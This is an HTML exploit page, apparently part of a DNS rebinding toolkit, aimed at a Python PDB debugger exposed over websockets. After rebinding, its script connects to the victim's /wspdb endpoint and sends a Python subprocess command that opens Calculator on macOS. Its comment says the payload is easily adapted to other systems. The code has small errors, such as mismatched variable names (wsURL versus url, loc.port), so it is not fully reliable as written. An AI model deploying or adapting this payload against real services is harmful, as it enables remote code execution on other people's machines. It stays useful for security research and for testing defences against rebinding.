<!doctype html>
<!--
This is a generic payload to exploit the Python `PDB` debugger exposed via websockets.
It opens the "Calculator" application on macOS. 
The payload can be easily modified to target different OSes or implementations.
The TCP port varies.
-->
<!doctype html>
<html>

<head>
    <title>payload-exposed-webpdb</title>
    <script src="payload.js"></script>
    <script>
        // attack() is called once DNS rebinding is successful
        // headers and body contains server data obtained 
        // from the victim service during rebinding, if any.
        function attack(headers, cookie, body) {
            let wsURL = "ws://" + location.hostname + ":" + loc.port +
                "/wspdb";

            const ws = new WebSocket(url);
            ws.onopen = () => ws.send(
                "import subprocess; subprocess.call([\"/usr/bin/open\", \"-W\", \"-n\", \"-a\", \"/Applications/Calculator.app\"])"
            );
            ws.onmessage = ({
                data
            }) => {
                console.log(data);
                ws.close();
            };
            ws.onerror = err => console.error('failed to connect');
        }
    </script>
</head>

<body onload="begin('/')" )>
    <h3>webpdb Payload</h3>
    <p><span id='hostname'></span>. <span id='rebindingstatus'>This page is waiting for a DNS update.</span></p>
</body>

</html>